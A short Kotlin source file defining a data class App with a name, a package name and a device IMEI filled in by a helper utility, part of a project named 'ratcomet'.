package ug.hix.ratcomet.model

import ug.hix.ratcomet.util.CometUtil

data class App(
    val name: String,
    val imei: String = CometUtil.getImei(),
    val packageName : String = ""
)